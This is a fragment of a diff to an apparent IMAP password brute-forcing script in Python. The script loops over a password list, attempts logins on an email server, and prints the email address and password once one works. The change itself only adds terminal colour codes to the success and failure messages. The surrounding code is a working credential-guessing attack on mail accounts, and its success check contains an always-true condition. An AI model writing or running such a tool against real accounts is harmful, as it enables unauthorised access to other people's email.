@@ -38,11 +38,11 @@ for password in paso :
      session = imaplib.IMAP4_SSL(host, port) 
      y = session.login(user, password[:-1])
      if (y == 'OK' or 'AUTHENTICATE completed'):
-         print ("> Correct Password have been found....!\n\r")
+         print (">\033[32m[!-OK-!]\033[37m Correct Password have been found....!\n\r")
          time.sleep(2)
          print( "Email: {0}".format(user)+"\n\r")
          print ("Password is: {0}".format(password)+"\n\r\n\r\n\r")
          session.logout()
          break;
  except :
-    print ("[!-NO-!] Faild Passowrd====>", password)
+    print ("\033[31m[!-NO-!]\033[37m Faild Passowrd====>", password)
